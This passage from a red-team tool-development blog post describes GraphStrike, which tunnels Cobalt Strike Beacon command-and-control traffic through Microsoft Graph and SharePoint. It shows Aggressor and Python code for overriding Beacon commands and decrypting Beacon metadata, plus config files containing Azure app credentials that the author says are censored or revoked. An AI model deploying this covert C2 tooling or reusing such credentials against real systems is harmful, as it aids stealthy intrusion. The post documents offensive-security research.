class="enlighter-text">        </span><span class="enlighter-m0">addAll</span><span class="enlighter-g1">(</span><span class="enlighter-k11">@bids</span><span class="enlighter-text">, $1</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    foreach $</span><span class="enlighter-m0">id</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-k11">@bids</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        $beaconIds = $beaconIds . </span><span class="enlighter-s0">" "</span><span class="enlighter-text"> . $id;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    $command = </span><span class="enlighter-s0">"cd $scriptDir &amp;&amp; $scriptPath $teamserverIP exit $beaconIds &amp;&amp; cd -"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># Append instructions to command to redirect stderr to processStdout</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    $command = $command . </span><span class="enlighter-s0">" 2&gt;&amp;1"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># Run command in a subshell to redirect stderr -&gt; processStdout</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    $data = </span><span class="enlighter-m0">exec</span><span class="enlighter-g1">(</span><span class="enlighter-text">@</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"/bin/sh"</span><span class="enlighter-text">, </span><span class="enlighter-s0">"-c"</span><span class="enlighter-text">, $command</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># We don't really need the output, but reading the data lets us block</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># until the server has completed work before we issue Beacon commands.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    $output = </span><span class="enlighter-m0">join</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">, </span><span class="enlighter-m0">readAll</span><span class="enlighter-g1">(</span><span class="enlighter-text">$data</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">size</span><span class="enlighter-g1">(</span><span class="enlighter-k11">@bids</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> 0</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        foreach $</span><span class="enlighter-m0">id</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-k11">@bids</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">bexit</span><span class="enlighter-g1">(</span><span class="enlighter-text">$id</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">bexit</span><span class="enlighter-g1">(</span><span class="enlighter-text">$1</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">alias exit {
    exitFunc($1);
}

sub exitFunc {
    local('$command $beaconIds @bids $id $data $output')

    # $1 gets passed in as different data types depending on how exit is called...
    if (typeOf($1) eq "class sleep.engine.types.StringValue")
    {
        add(@bids, $1);
    }
    else if (typeOf($1) eq "class sleep.runtime.CollectionWrapper")
    {
        addAll(@bids, $1);
    }

    foreach $id (@bids)
    {
        $beaconIds = $beaconIds . " " . $id;
    }

    $command = "cd $scriptDir &amp;&amp; $scriptPath $teamserverIP exit $beaconIds &amp;&amp; cd -";

    # Append instructions to command to redirect stderr to processStdout
    $command = $command . " 2&gt;&amp;1";

    # Run command in a subshell to redirect stderr -&gt; processStdout
    $data = exec(@("/bin/sh", "-c", $command));

    # We don't really need the output, but reading the data lets us block
    # until the server has completed work before we issue Beacon commands.
    $output = join("\n", readAll($data));

    if (size(@bids) &gt; 0)
    {
        foreach $id (@bids)
        {
            bexit($id);
        }
    }
    else
    {
        bexit($1);
    }
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">alias exit {
    exitFunc($1);
}

sub exitFunc {
    local('$command $beaconIds @bids $id $data $output')

    # $1 gets passed in as different data types depending on how exit is called...
    if (typeOf($1) eq "class sleep.engine.types.StringValue")
    {
        add(@bids, $1);
    }
    else if (typeOf($1) eq "class sleep.runtime.CollectionWrapper")
    {
        addAll(@bids, $1);
    }

    foreach $id (@bids)
    {
        $beaconIds = $beaconIds . " " . $id;
    }

    $command = "cd $scriptDir &amp;&amp; $scriptPath $teamserverIP exit $beaconIds &amp;&amp; cd -";

    # Append instructions to command to redirect stderr to processStdout
    $command = $command . " 2&gt;&amp;1";

    # Run command in a subshell to redirect stderr -&gt; processStdout
    $data = exec(@("/bin/sh", "-c", $command));

    # We don't really need the output, but reading the data lets us block
    # until the server has completed work before we issue Beacon commands.
    $output = join("\n", readAll($data));

    if (size(@bids) &gt; 0)
    {
        foreach $id (@bids)
        {
            bexit($id);
        }
    }
    else
    {
        bexit($1);
    }
}</pre>
</div>
</div>
</div>
<p>Aggressor lets you override standard Beacon commands; at line 1, a new ‘exit’ command is defined which calls ‘exitFunc’ on line 5. These custom functions that are ran when an existing command is called operate in a similar way to those used in GraphLdr, wherein we go take some additional actions before we also call the original function/code that was intended by the user. In this example we tell the OS to run a Python3 script called ‘message.py’. This script comes included with GraphStrike and is used to connect to a socket that is exposed and listening on the GraphStrike server. Using this connection, a message is sent from the Cobalt Strike client to the GraphStrike server informing it of the exit command and the associated Beacon ID. For ‘exit’, all we do on the server side of things is kill the thread that services that Beacon to conserve resources and then delete the TS tasking file and Beacon output file from SharePoint. The ‘sleep’ command of course adjusts the sleep time in the ‘BeaconComms’ loop to match what was issued to Beacon.</p>
</div>
<p data-renderer-start-pos="87278">There was one big hiccup in this whole plan. To make this work there has to be some common identifier for a Beacon that both the TS and the GraphStrike server have access to. The only value I was able to find was the Beacon session ID; this is the value that is included in the name of the Beacon output file after the Beacon metadata and a delimiter. The glaring issue here is that the Beacon output file is only created when Beacon has output to send; until that point we only have the TS tasking file, so until we get Beacon to run a command and return output this value is unavailable to us… or so I thought.</p>
<p data-renderer-start-pos="87892">Open source tooling comes to the rescue yet again. I had previously seen various “Cobalt Strike Beacon config parsers” but never had much reason to check them out myself. <a class="cc-tgpl01" title="https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py" href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py" data-testid="link-with-safety" data-renderer-mark="true">Didier Stevens released a tool</a> several years ago for this purpose, and the GraphStrike server makes use of it in order to get around this blocker in the ‘GetBeaconId’ function:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k4"># External cs-decrypt-metadata.py script from https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">metadataScript = </span><span class="enlighter-s0">"inc/cs-decrypt-metadata.py"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">metadataCommand = f</span><span class="enlighter-s0">"{metadataScript} -f {CS_DIR}.cobaltstrike.beacon_keys -t 7:Metadata,13,12 "</span><span class="enlighter-text"> </span><span class="enlighter-k4"># Leave space as we tack on metadata afterwards</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">def </span><span class="enlighter-m0">GetBeaconId</span><span class="enlighter-g1">(</span><span class="enlighter-text">metadata</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text">    beaconId = None</span></div></div><div class=""><div><span class="enlighter-text">    output = subprocess.</span><span class="enlighter-m3">getoutput</span><span class="enlighter-g1">(</span><span class="enlighter-text">metadataCommand + metadata</span><span class="enlighter-g1">)</span><span class="enlighter-text">.</span><span class="enlighter-m3">split</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">for</span><span class="enlighter-text"> line in output:</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-s0">"bid:"</span><span class="enlighter-text"> in line:</span></div></div><div class=""><div><span class="enlighter-text">            beaconId = output</span><span class="enlighter-g1">[</span><span class="enlighter-text">output.</span><span class="enlighter-m3">index</span><span class="enlighter-g1">(</span><span class="enlighter-text">line</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + 2</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># Make sure the metadata parser actually runs</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> beaconId == None:</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">p_err</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"Cannot parse BeaconId: are you running in a venv / have you installed all dependencies?"</span><span class="enlighter-text">, </span><span class="enlighter-e0">True</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">else</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> beaconId</span></div></div></div><div class="enlighter-raw"># External cs-decrypt-metadata.py script from https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py
metadataScript = "inc/cs-decrypt-metadata.py"
metadataCommand = f"{metadataScript} -f {CS_DIR}.cobaltstrike.beacon_keys -t 7:Metadata,13,12 " # Leave space as we tack on metadata afterwards

def GetBeaconId(metadata):
    beaconId = None
    output = subprocess.getoutput(metadataCommand + metadata).split()

    for line in output:
        if "bid:" in line:
            beaconId = output[output.index(line) + 2]

    # Make sure the metadata parser actually runs
    if beaconId == None:
        p_err("Cannot parse BeaconId: are you running in a venv / have you installed all dependencies?", True)
    else:
        return beaconId</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c"># External cs-decrypt-metadata.py script from https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py
metadataScript&nbsp;=&nbsp;"inc/cs-decrypt-metadata.py"
metadataCommand&nbsp;=&nbsp;f"{metadataScript}&nbsp;-f&nbsp;{CS_DIR}.cobaltstrike.beacon_keys&nbsp;-t&nbsp;7:Metadata,13,12&nbsp;"&nbsp;#&nbsp;Leave&nbsp;space&nbsp;as&nbsp;we&nbsp;tack&nbsp;on&nbsp;metadata&nbsp;afterwards

def&nbsp;GetBeaconId(metadata):
&nbsp;&nbsp;&nbsp;&nbsp;beaconId&nbsp;=&nbsp;None
&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;subprocess.getoutput(metadataCommand&nbsp;+&nbsp;metadata).split()

&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;line&nbsp;in&nbsp;output:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;"bid:"&nbsp;in&nbsp;line:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beaconId&nbsp;=&nbsp;output[output.index(line)&nbsp;+&nbsp;2]

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Make&nbsp;sure&nbsp;the&nbsp;metadata&nbsp;parser&nbsp;actually&nbsp;runs
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;beaconId&nbsp;==&nbsp;None:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p_err("Cannot&nbsp;parse&nbsp;BeaconId:&nbsp;are&nbsp;you&nbsp;running&nbsp;in&nbsp;a&nbsp;venv&nbsp;/&nbsp;have&nbsp;you&nbsp;installed&nbsp;all&nbsp;dependencies?",&nbsp;True)
&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;beaconId</pre>
<p>The ‘cs-decrypt-metadata.py’ tool can take Beacon’s encrypted metadata, undo whatever profile-based masking or manipulation that was applied, and decrypt it using the TS’s encryption keys which are stored in the TS directory as ‘.cobaltstrike.beacon_keys’. This allows the GraphStrike server to recover a Beacon’s session ID / Beacon ID from the TS tasking file, which means we no longer require Beacon to have sent output first.</p>
<h4 id="The-Provisioner" data-renderer-start-pos="89441"><span class="ez-toc-section" id="The_Provisioner" ez-toc-data-id="#The_Provisioner"></span>The Provisioner<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="89458">There isn’t much to say about the GraphStrike provisioner aside from the fact that it exists. Early in this blog post I mentioned that making GraphStrike easy to use and repeatable was a key goal, and the provisioner plays a part in making this happen. Users are on their own when it comes to creating an Azure tenant and making sure license requirements are met to have a sharepoint site, but the provisioner takes it from there. It uses the Azure CLI Python library to interface with the user’s tenant and create the Azure app as well as the associated client secret that will be used by GraphStrike. It further assigns required permissions to the app so that it can access the file related Graph API methods that we have detailed. Most importantly, it takes all of the variables and values that are returned from this process and creates two files on disk: ‘config.h’ and ‘config.py’.</p>
<hr>
<div class="ak-editor-panel cc-ah2d0k" data-panel-type="info">
<div class="ak-editor-panel__content">
<p style="padding-left: 40px;" data-renderer-start-pos="90348"><span style="color: #3366ff;"><strong>• </strong></span>The pieces of information in the config files, taken together or even in some cases alone, constitute sensitive information that you don’t want to go around sharing. The values in the example below are either censored or no longer valid as of time of publication.</p>
<hr>
</div>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k4">#include "include.h"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define SHAREPOINT_ADDRESS C_PTR ( OFFSET ( "/v1.0/sites/CENSORED.sharepoint.com,23CEN360-aSO1-44ad-8R4-3a6b80ED10cb,c1CEN2efe-aSO9-4076-9R1-4SDW3918ED93a/drive" ) )</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define APP_CLIENT_ID C_PTR ( OFFSET ( "854b480d-a5fd-4789-b2c1-511a3ee4cef7" ) )</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define APP_CLIENT_SECRET C_PTR ( OFFSET ( "K7D8Q~esKoxpcHbnCeisbg4pTzzFrM3nDsSH1ca-" ) )</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define TENANT_ID C_PTR ( OFFSET ( "8aCEN074b-dSO1-4Rab-99c5-e381ED492902" ) )</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define BID_DELIMITER C_PTR ( OFFSET ( "pD9-tK") )</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define HTTP_GET_PREFIX C_PTR ( OFFSET ( "_" ) )</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define HTTP_POST_PREFIX C_PTR ( OFFSET ( "-_" ) )</span></div></div></div><div class="enlighter-raw">#include "include.h"

#define SHAREPOINT_ADDRESS C_PTR ( OFFSET ( "/v1.0/sites/CENSORED.sharepoint.com,23CEN360-aSO1-44ad-8R4-3a6b80ED10cb,c1CEN2efe-aSO9-4076-9R1-4SDW3918ED93a/drive" ) )
#define APP_CLIENT_ID C_PTR ( OFFSET ( "854b480d-a5fd-4789-b2c1-511a3ee4cef7" ) )
#define APP_CLIENT_SECRET C_PTR ( OFFSET ( "K7D8Q~esKoxpcHbnCeisbg4pTzzFrM3nDsSH1ca-" ) )
#define TENANT_ID C_PTR ( OFFSET ( "8aCEN074b-dSO1-4Rab-99c5-e381ED492902" ) )
#define BID_DELIMITER C_PTR ( OFFSET ( "pD9-tK") )
#define HTTP_GET_PREFIX C_PTR ( OFFSET ( "_" ) )
#define HTTP_POST_PREFIX C_PTR ( OFFSET ( "-_" ) )</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">#include "include.h"

#define SHAREPOINT_ADDRESS C_PTR ( OFFSET ( "/v1.0/sites/CENSORED.sharepoint.com,23CEN360-aSO1-44ad-8R4-3a6b80ED10cb,c1CEN2efe-aSO9-4076-9R1-4SDW3918ED93a/drive" ) )
#define APP_CLIENT_ID C_PTR ( OFFSET ( "854b480d-a5fd-4789-b2c1-511a3ee4cef7" ) )
#define APP_CLIENT_SECRET C_PTR ( OFFSET ( "K7D8Q~esKoxpcHbnCeisbg4pTzzFrM3nDsSH1ca-" ) )
#define TENANT_ID C_PTR ( OFFSET ( "8aCEN074b-dSO1-4Rab-99c5-e381ED492902" ) )
#define BID_DELIMITER C_PTR ( OFFSET ( "pD9-tK") )
#define HTTP_GET_PREFIX C_PTR ( OFFSET ( "_" ) )
#define HTTP_POST_PREFIX C_PTR ( OFFSET ( "-_" ) )</pre>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k4">#!/usr/bin/python3</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">TENANT_ID = </span><span class="enlighter-s0">"8aCEN074b-dSO1-4Rab-99c5-e381ED492902"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">CLIENT_ID = </span><span class="enlighter-s0">"854b480d-a5fd-4789-b2c1-511a3ee4cef7"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">CLIENT_SECRET = </span><span class="enlighter-s0">"K7D8Q~esKoxpcHbnCeisbg4pTzzFrM3nDsSH1ca-"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">SITE_ID = </span><span class="enlighter-s0">"CENSORED.sharepoint.com,23CEN360-aSO1-44ad-8R4-3a6b80ED10cb,c1CEN2efe-aSO9-4076-9R1-4SDW3918ED93a"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">DRIVE_ID = </span><span class="enlighter-s0">"b!YCENSORED70EJJ880"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">BID_DELIMITER = </span><span class="enlighter-s0">"pD9-tK"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">HTTP_GET_PREFIX = </span><span class="enlighter-s0">"_"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">HTTP_POST_PREFIX = </span><span class="enlighter-s0">"-_"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">CS_DIR = </span><span class="enlighter-s0">"/opt/cobaltstrike/"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">SLEEP_TIME = </span><span class="enlighter-s0">"5000"</span></div></div></div><div class="enlighter-raw">#!/usr/bin/python3

TENANT_ID = "8aCEN074b-dSO1-4Rab-99c5-e381ED492902"
CLIENT_ID = "854b480d-a5fd-4789-b2c1-511a3ee4cef7"
CLIENT_SECRET = "K7D8Q~esKoxpcHbnCeisbg4pTzzFrM3nDsSH1ca-"
SITE_ID = "CENSORED.sharepoint.com,23CEN360-aSO1-44ad-8R4-3a6b80ED10cb,c1CEN2efe-aSO9-4076-9R1-4SDW3918ED93a"
DRIVE_ID = "b!YCENSORED70EJJ880"
BID_DELIMITER = "pD9-tK"
HTTP_GET_PREFIX = "_"
HTTP_POST_PREFIX = "-_"
CS_DIR = "/opt/cobaltstrike/"
SLEEP_TIME = "5000"</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">#!/usr/bin/python3

TENANT_ID = "8aCEN074b-dSO1-4Rab-99c5-e381ED492902"
CLIENT_ID = "854b480d-a5fd-4789-b2c1-511a3ee4cef7"
CLIENT_SECRET = "K7D8Q~esKoxpcHbnCeisbg4pTzzFrM3nDsSH1ca-"
SITE_ID = "CENSORED.sharepoint.com,23CEN360-aSO1-44ad-8R4-3a6b80ED10cb,c1CEN2efe-aSO9-4076-9R1-4SDW3918ED93a"
DRIVE_ID = "b!YCENSORED70EJJ880"
BID_DELIMITER = "pD9-tK"
HTTP_GET_PREFIX = "_"
HTTP_POST_PREFIX = "-_"
CS_DIR = "/opt/cobaltstrike/"
SLEEP_TIME = "5000"</pre>
<p>Config.h is compiled into GraphLdr so that the UDRL contains all of the required information to use Graph API. Config.py is similarly loaded by the GraphStrike server at runtime so that it can do the same. When the provisioner is complete, users need simply start their TS, start their GraphStrike server, and then distribute the ‘client’ folder within GraphStrike to every operator who is going to connect to the TS using the Cobalt Strike client. After loading GraphStrike.cna, users are ready to create GraphStrike Beacons.</p>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
<h2 id="Conclusion" data-renderer-start-pos="92182"><span class="ez-toc-section" id="Conclusion" ez-toc-data-id="#Conclusion"></span>Conclusion<span class="ez-toc-section-end"></span></h2>
<p data-renderer-start-pos="92194">A massive thanks to readers who stuck with me thus far. I hope that this blog post was interesting for at least a few people and that it might help encourage others to try their hand at tool development. I’m available at @Octoberfest73 on twitter as well as in the Red Siege Discord channel for questions regarding GraphStrike.</p>
<p>&nbsp;</p>
<h2 id="Credits" data-renderer-start-pos="92523"><span class="ez-toc-section" id="Credits" ez-toc-data-id="#Credits"></span>Credits<span class="ez-toc-section-end"></span></h2>
<p data-renderer-start-pos="92532">GraphStrike would not have been possible without the contributions of the following individuals:</p>
<ol class="ak-ol" start="1" data-indent-level="1">
<li>
<p data-renderer-start-pos="92632"><a class="cc-tgpl01" title="https://twitter.com/kyleavery_" href="https://twitter.com/kyleavery_" data-testid="link-with-safety" data-renderer-mark="true">Kyle Avery</a> for <a class="cc-tgpl01" title="https://github.com/kyleavery/AceLdr" href="https://github.com/kyleavery/AceLdr" data-testid="link-with-safety" data-renderer-mark="true">AceLdr</a></p>
</li>
<li>
<p data-renderer-start-pos="92657"><a class="cc-tgpl01" title="https://twitter.com/DidierStevens" href="https://twitter.com/DidierStevens" data-testid="link-with-safety" data-renderer-mark="true">Dider Stevens</a> for <a class="cc-tgpl01" title="https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py" href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py" data-testid="link-with-safety" data-renderer-mark="true">cs-decrypt-metadata.py</a></p>
</li>
<li>
<p data-renderer-start-pos="92701">Mike Saunders, Corey Overstreet, Chris Truncer, and Justin Palk from the Red Siege team who all kindly beta tested GraphStrike and identified multiple issues that were fixed prior to release.</p>
<p>&nbsp;</p></li>
</ol>
<hr>
<p>&nbsp;</p>
<h4 id="About-Alex-Reid,-Intern:" data-renderer-start-pos="3870"><span class="ez-toc-section" id="About_Alex_Reid_Intern" ez-toc-data-id="#About_Alex_Reid_Intern"></span>About Alex Reid, Intern:<span class="ez-toc-section-end"></span></h4>
<div class="rich-media-item mediaSingleView-content-wrap image-align-start cc-of0om4" data-layout="align-start" data-width="197" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-191ht93">
<div data-type="file" data-node-type="media" data-width="197" data-height="248" data-id="6a45e5ca-4076-4c51-9552-bdda6334090a" data-collection="contentId-97386497" data-file-name="Capture-20230807-164947.JPG" data-file-size="15668" data-file-mime-type="image/jpeg" data-alt="Capture-20230807-164947.JPG" data-context-id="97386497">
<div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-sjgc9k" data-testid="media-card-view">
<div class="media-file-card-view cc-1yn77bd" data-testid="media-file-card-view" data-test-status="complete" data-test-media-name="Capture-20230807-164947.JPG" data-test-progress="1"><img loading="lazy" decoding="async" class="size-medium alignnone" src="https://redsiege.com/wp-content/uploads/2024/01/Alex-Reid.jpg" width="197" height="248"></div>
<div data-testid="media-file-card-view" data-test-status="complete" data-test-media-name="Capture-20230807-164947.JPG" data-test-progress="1"></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="rich-media-item mediaSingleView-content-wrap image-center cc-4kagsy" data-layout="center" data-width="760" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-k6x2vs">
<div data-type="file" data-node-type="media" data-width="898" data-height="420" data-id="d06e11e4-da43-406a-9202-493b67203f59" data-collection="contentId-85164073" data-file-name="image-20240106-161600.png" data-file-size="131245" data-file-mime-type="image/png" data-alt="" data-context-id="85164073">
<div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-1r63qe5" data-testid="media-card-view">
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="code-block cc-ceksvt">
<div class="ak-editor-panel cc-ah2d0k" data-panel-type="info">
<div class="ak-editor-panel__content">
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="rich-media-item mediaSingleView-content-wrap image-align-start cc-of0om4" data-layout="align-start" data-width="197" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-191ht93">
<div data-type="file" data-node-type="media" data-width="197" data-height="248" data-id="6a45e5ca-4076-4c51-9552-bdda6334090a" data-collection="contentId-97386497" data-file-name="Capture-20230807-164947.JPG" data-file-size="15668" data-file-mime-type="image/jpeg" data-alt="Capture-20230807-164947.JPG" data-context-id="97386497">
<div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-sjgc9k" data-testid="media-card-view">
